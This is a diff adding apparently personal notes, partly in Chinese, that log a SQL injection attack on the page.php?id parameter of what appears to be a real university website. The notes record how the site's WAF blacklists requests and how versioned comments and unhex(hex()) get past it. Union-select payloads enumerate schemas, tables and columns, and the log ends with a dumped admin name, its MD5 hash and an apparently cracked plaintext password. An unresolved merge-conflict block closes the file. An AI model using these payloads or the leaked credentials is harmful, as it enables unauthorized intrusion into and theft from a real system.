@@ -1,0 +1,38 @@
+tar:
+	http://shi.hkbu.edu.hk/en/page.php?id=29
+黑盒规则： http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(3),version(),5,6,7,8 from information_schema.schemata
+	0.最好先访问正常地址http://shi.hkbu.edu.hk/en/page.php?id=29让waf觉得这个链接看上去可信
+	1.union 空格 select ，group_concat都允许
+	2.允许单独出现from information_schema.schemata，但只能执行一次就被黑，期间如果有其他ip访问正常连接，则可以在h_ip上继续执行一次
+	3.使用concat_ws不会被加入黑名单？貌似只能多执行一次而已，之后依然黑名单
+	4.只是单纯出现group_concat(schema_name)不会被加入黑名单，如果后面跟了from information_schema等就会被拉黑
+http://shi.hkbu.edu.hk/en/page.php?id=29
+	5.charencode.tamper之后可以执行多次/en/page.php?id=-29 union select 1,2,group_concat(555),version(),5,6,7,8 from information_schema.schemata
+bypass:()
+	http://shi.hkbu.edu.hk/en/page.php?id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.schemata*/-- 
+tables:
+	http://shi.hkbu.edu.hk/en/page.php?id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(table_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.tables where table_schema=0x736869*/-- 
+	~'category'~,~'posts'~,~'ships'~,~'slider'~,~'user'~
+columns:(for "user"):
+	http://shi.hkbu.edu.hk/en/page.php?id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(column_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.columns where table_name=0x75736572*/-- 
+	~'id'~,~'name'~,~'password'~
+column_value:(for name,password):
+http://shi.hkbu.edu.hk/en/page.php?id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user*/-- 
+~'admin898b18476b5339dd5b1b186e736cac92'~
+
+md5 jiemi hkbingocom
+
+
+anaylize:
+good:
+http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user
+fail:(without unhex(Hex()))
+<<<<<<< HEAD
+http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(0x7e,0x27,cast(name as char),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user
+
+
+
+1.http://www.xxme.me/wordpress/341.html
+=======
+http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(0x7e,0x27,cast(name as char),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user
+>>>>>>> 9a679509e551f014f0d31a7af78f291cc15ec32e
